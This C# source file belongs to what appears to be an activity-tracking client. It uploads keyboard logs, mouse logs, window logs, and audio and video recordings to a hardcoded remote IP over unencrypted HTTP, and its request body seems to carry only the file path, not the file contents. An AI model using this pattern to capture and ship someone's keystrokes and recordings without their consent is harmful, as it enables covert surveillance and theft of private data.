using System;
using RestSharp;

namespace TrackzamClient
{
    public class DataSender
    {
        public static void SetIPAdress(string ipAddress)
        {
            _ipAddress = ipAddress;
        }

        public static string IPAddress => _ipAddress;
        public static void SendAudioLogs(string path)
        {
            SendFileAsync("send_audio_logs", path);
        }
        
        public static void SendAudioFile(string path)
        {
            SendFileAsync("send_audio_file", path, "8080");
        }
        
        public static void SendVideoFile(string path)
        {
            SendFileAsync("send_video_file", path, "8080");
        }
        
        public static void SendKeyboardLogs(string path)
        {
            SendFileAsync("send_keyboard_logs", path);
        }
        
        public static void SendMouseLogs(string path)
        {
            SendFileAsync("send_mouse_logs", path);
        }
        
        public static void SendWindowLogs(string path)
        {
            SendFileAsync("send_window_logs", path);
        }
        
        private static async void SendFileAsync(string type, string path, string port = "8000")
        {
            var client = new RestClient("http://"+_ipAddress+":"+port+"/api/"+type+"?email="+InfoSaver.GetEmail());
            var request = new RestRequest(Method.POST);
            request.AddHeader("cache-control", "no-cache");
            request.AddHeader("authorization", "Basic "+InfoSaver.AuthToken);
            request.AddHeader("enctype", "multipart/form-data");
            request.AddHeader("content-type", "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW");
            request.AddParameter("multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW", "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+path+"\"\r\nContent-Type: text/plain\r\n\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--", ParameterType.RequestBody);
            IRestResponse response = await client.ExecuteAsync(request);
            Console.WriteLine(response.Content);
        }

        private static string _ipAddress = "34.71.243.7";
    }
}